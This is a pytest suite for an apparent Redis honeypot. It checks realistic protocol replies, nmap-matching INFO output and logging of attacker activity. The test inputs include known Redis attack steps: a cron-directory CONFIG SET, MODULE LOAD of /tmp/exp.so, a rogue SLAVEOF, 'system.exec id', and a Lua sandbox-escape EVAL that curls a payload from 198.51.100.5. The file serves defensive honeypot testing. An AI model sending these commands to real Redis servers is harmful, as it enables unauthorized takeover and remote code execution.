"""End-to-end protocol tests: redis-py (a real client) and raw sockets against the server."""

from __future__ import annotations

import asyncio

import pytest
import redis.asyncio as aioredis
from conftest import HarnessFactory, cmd, talk
from redis.exceptions import ResponseError


def client(port: int, **kw: object) -> aioredis.Redis:
    return aioredis.Redis(host="127.0.0.1", port=port, socket_timeout=5, **kw)  # type: ignore[arg-type]


async def test_basic_commands(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        r = client(h.port)
        assert await r.ping() is True
        assert await r.echo("hi") == b"hi"
        assert await r.set("a", "1") is True
        assert await r.get("a") == b"1"
        assert await r.incr("a") == 2
        assert await r.append("a", "x") == 2
        assert await r.get("missing") is None
        assert await r.exists("a") == 1
        assert await r.delete("a") == 1
        assert await r.type("a") == b"none"
        assert await r.set("n", "1", nx=True) is True
        assert await r.set("n", "2", nx=True) is None
        assert await r.mset({"x": "1", "y": "2"}) is True
        assert await r.mget(["x", "nope", "y"]) == [b"1", None, b"2"]
        assert await r.select(3) is True
        assert await r.dbsize() == 0
        with pytest.raises(ResponseError, match="DB index is out of range"):
            await r.select(99)
        await r.aclose()


async def test_keyspace_is_per_connection(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        a, b = client(h.port), client(h.port)
        base = await a.dbsize()
        assert base >= 3  # the deployment's fake keys
        await a.set("only-a", "1")
        assert await a.dbsize() == base + 1
        assert await b.dbsize() == base
        assert await b.get("only-a") is None
        await a.flushall()
        assert await a.dbsize() == 0
        assert await b.dbsize() == base
        await a.aclose()
        await b.aclose()


async def test_keys_and_scan(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        r = client(h.port)
        await r.flushall()
        await r.mset({"user:1": "a", "user:2": "b", "other": "c"})
        assert sorted(await r.keys("user:*")) == [b"user:1", b"user:2"]
        assert sorted(await r.keys("*")) == [b"other", b"user:1", b"user:2"]
        cursor, found = await r.scan(0, match="user:?")
        assert cursor == 0 and sorted(found) == [b"user:1", b"user:2"]
        assert sorted([k async for k in r.scan_iter(match="o*")]) == [b"other"]
        await r.aclose()


async def test_keyspace_is_bounded(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        r = client(h.port)
        await r.flushall()
        for i in range(200):
            await r.set(f"k{i}", "v" * 1000)
        assert await r.dbsize() <= 64
        big = b"x" * 400_000
        assert await r.set("big", big) is True
        got = await r.get("big")
        assert got is None or len(got) <= 16 * 1024
        assert h.sensor.buffered == 0 or h.sensor.buffered < 1_000_000
        await r.aclose()


async def test_info_matches_what_nmap_expects(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        raw = await talk(h.port, cmd("INFO"))
        assert raw.startswith(b"$")
        header, _, body = raw.partition(b"\r\n")
        assert int(header[1:]) == len(body) - 2
        # nmap-service-probes: ^\$\d+\r\n(?:#[^\r\n]*\r\n)*redis_version:([.\d]+)\r\n
        assert body.startswith(b"# Server\r\nredis_version:7.2.")
        text = body.decode()
        for needle in (
            "redis_mode:standalone",
            "os:Linux 6.8.0-",
            " x86_64",
            "arch_bits:64",
            "tcp_port:6379",
            "role:master",
            "cluster_enabled:0",
            "# Keyspace",
            "db0:keys=",
        ):
            assert needle in text, needle
        assert "honeypot" not in text.lower() and "suckerpot" not in text.lower()
        assert f"run_id:{h.profile.run_id}" in text
        r = client(h.port)
        mem = await r.info("memory")
        assert mem["used_memory"] > 500_000
        assert set(await r.info("replication")) >= {"role", "master_replid"}
        assert await talk(h.port, cmd("INFO", "nonexistent")) == b"$0\r\n\r\n"
        await r.aclose()


async def test_config_get_set_is_per_connection(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        a, b = client(h.port), client(h.port)
        assert (await a.config_get("dir"))["dir"] == h.profile.workdir
        assert await a.config_set("dir", "/var/spool/cron/") is True
        assert await a.config_set("dbfilename", "root") is True
        assert (await a.config_get("dir"))["dir"] == "/var/spool/cron/"
        assert (await b.config_get("dir"))["dir"] == h.profile.workdir
        everything = await a.config_get("*")
        assert {"dir", "dbfilename", "appendonly", "save", "requirepass"} <= set(everything)
        with pytest.raises(ResponseError, match="can't be a path"):
            await a.config_set("dbfilename", "../x")
        with pytest.raises(ResponseError, match="Unknown option"):
            await a.config_set("nonsense", "1")
        with pytest.raises(ResponseError, match="immutable"):
            await a.config_set("daemonize", "yes")
        assert await a.config_set("appendonly", "yes") is True
        assert "appendonly" in await a.config_get("append*")
        await a.aclose()
        await b.aclose()


async def test_save_replies(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        assert await talk(h.port, cmd("SAVE") + cmd("BGSAVE")) == (
            b"+OK\r\n+Background saving started\r\n"
        )


async def test_auth_without_password(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(h.port, cmd("AUTH", "hunter2"))
        assert out.startswith(b"-ERR AUTH <password> called without any password configured")
        assert await talk(h.port, cmd("AUTH", "default", "x")) == b"+OK\r\n"
        assert (await talk(h.port, cmd("AUTH", "root", "x"))).startswith(b"-WRONGPASS")
        logins = await h.events("login_attempt")
        assert [(e.data["username"], e.data["password"], e.data["success"]) for e in logins] == [
            ("default", "hunter2", False),
            ("default", "x", True),
            ("root", "x", False),
        ]
        assert all(e.data["method"] == "redis-auth" for e in logins)


async def test_requirepass_roundtrip(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(
            h.port,
            cmd("CONFIG", "SET", "requirepass", "s3cret")
            + cmd("AUTH", "bad")
            + cmd("AUTH", "s3cret"),
        )
        assert out.startswith(b"+OK\r\n-WRONGPASS")
        assert out.endswith(b"+OK\r\n")


async def test_hello_resp3(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(
            h.port, cmd("HELLO", "3") + cmd("GET", "missing") + cmd("CONFIG", "GET", "dir")
        )
        assert out.startswith(b"%7\r\n$6\r\nserver\r\n$5\r\nredis\r\n")
        assert b"_\r\n" in out
        assert b"%1\r\n$3\r\ndir\r\n" in out
        assert (await talk(h.port, cmd("HELLO", "4"))).startswith(b"-NOPROTO")
        c = client(h.port, protocol=3)
        assert await c.ping() is True
        assert await c.set("k", "v") is True
        assert await c.get("k") == b"v"
        assert (await c.config_get("dir"))["dir"] == h.profile.workdir
        await c.aclose()


async def test_unknown_command_text(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        assert await talk(h.port, cmd("FOOBAR", "a", "b")) == (
            b"-ERR unknown command 'FOOBAR', with args beginning with: 'a' 'b' \r\n"
        )
        assert await talk(h.port, cmd("system.exec", "id")) == (
            b"-ERR unknown command 'system.exec', with args beginning with: 'id' \r\n"
        )
        assert (
            await talk(h.port, cmd("GET"))
            == b"-ERR wrong number of arguments for 'get' command\r\n"
        )
        assert (await talk(h.port, cmd("CONFIG", "FOO"))).startswith(
            b"-ERR unknown subcommand 'FOO'. Try CONFIG HELP."
        )


async def test_module_load_and_unload(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(h.port, cmd("MODULE", "LOAD", "/tmp/exp.so") + cmd("MODULE", "LIST"))
        assert out == b"-ERR Error loading the extension. Please check the server logs.\r\n*0\r\n"
        cmds = await h.events("command")
        assert cmds[0].data["module_path"] == "/tmp/exp.so"
        assert "module_load" in cmds[0].data["flags"]


async def test_slaveof_is_recorded_never_contacted(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        # A listener that must never receive a connection.
        hits: list[int] = []

        async def trap(_r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
            hits.append(1)
            w.close()

        srv = await asyncio.start_server(trap, "127.0.0.1", 0)
        trap_port = srv.sockets[0].getsockname()[1]
        out = await talk(
            h.port,
            cmd("SLAVEOF", "127.0.0.1", str(trap_port))
            + cmd("INFO", "replication")
            + cmd("SLAVEOF", "NO", "ONE"),
            wait=0.5,
        )
        assert out.startswith(b"+OK\r\n")
        assert b"role:slave" in out and f"master_port:{trap_port}".encode() in out
        assert out.endswith(b"+OK\r\n")
        await asyncio.sleep(0.5)
        srv.close()
        assert hits == []
        scans = await h.events("scan")
        rep = [e for e in scans if e.data["kind"] == "redis_replication"]
        assert rep[0].data["master_host"] == "127.0.0.1" and rep[0].data["master_port"] == trap_port
        cmds = [e for e in await h.events("command") if e.data["command"] == "SLAVEOF"]
        assert "slaveof" in cmds[0].data["flags"]


async def test_eval_is_recorded_not_run(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        script = "local io_l = package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io'); curl http://198.51.100.5/a"
        out = await talk(
            h.port,
            cmd("EVAL", script, "0")
            + cmd("EVAL", "return 42", "0")
            + cmd("EVALSHA", "a" * 40, "0"),
        )
        assert out.startswith(
            b"-ERR user_script:1: Script attempted to access nonexistent global variable 'package'"
        )
        assert b":42\r\n" in out and b"-NOSCRIPT" in out
        cmds = await h.events("command")
        assert "lua_sandbox_escape" in cmds[0].data["flags"] and "eval" in cmds[0].data["flags"]
        downloads = await h.events("download_attempt")
        assert downloads[0].data["url"] == "http://198.51.100.5/a"


async def test_cross_protocol_attack_closes_like_redis(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(h.port, b"POST / HTTP/1.1\r\nHost: x\r\n\r\n", wait=1.0)
        assert out == b""  # connection dropped without a reply
        scans = await h.events("scan")
        assert scans[0].data["kind"] == "cross_protocol"
        disc = await h.wait_disconnects(1)
        assert disc[0].data["reason"] == "cross_protocol"
        assert await talk(h.port, b"GET / HTTP/1.0\r\n\r\n") == (
            b"-ERR wrong number of arguments for 'get' command\r\n"
        )


async def test_protocol_error_replies_and_closes(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(h.port, b"*1\r\n$abc\r\n", wait=1.0)
        assert out == b"-ERR Protocol error: invalid bulk length\r\n"
        out = await talk(h.port, b'SET "oops\r\n', wait=1.0)
        assert out == b"-ERR Protocol error: unbalanced quotes in request\r\n"
        scans = await h.events("scan")
        assert {e.data["kind"] for e in scans} == {"redis_protocol_error"}


async def test_quit_and_pipelining(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        out = await talk(h.port, cmd("PING") * 3 + cmd("QUIT") + cmd("PING"), wait=1.0)
        assert out == b"+PONG\r\n" * 3 + b"+OK\r\n"
        disc = await h.wait_disconnects(1)
        assert disc[0].data["reason"] == "quit" and disc[0].data["commands"] == 4


async def test_client_commands(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        r = client(h.port)
        assert await r.client_setname("bot") is True
        assert await r.client_getname() == "bot"
        assert isinstance(await r.client_id(), int)
        listing = await r.execute_command("CLIENT", "LIST")  # type: ignore[no-untyped-call]
        assert b"name=bot" in listing and b"addr=127.0.0.1:" in listing
        assert await talk(h.port, cmd("COMMAND", "COUNT")) == b":241\r\n"
        assert await r.time() is not None
        assert (await r.role())[0] == b"master"
        await r.aclose()


async def test_shutdown_is_not_obeyed(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        assert await talk(h.port, cmd("SHUTDOWN", "NOSAVE")) == b""
        assert await talk(h.port, cmd("PING")) == b"+PONG\r\n"
        disc = await h.wait_disconnects(2)
        assert "shutdown_command" in {d.data["reason"] for d in disc}
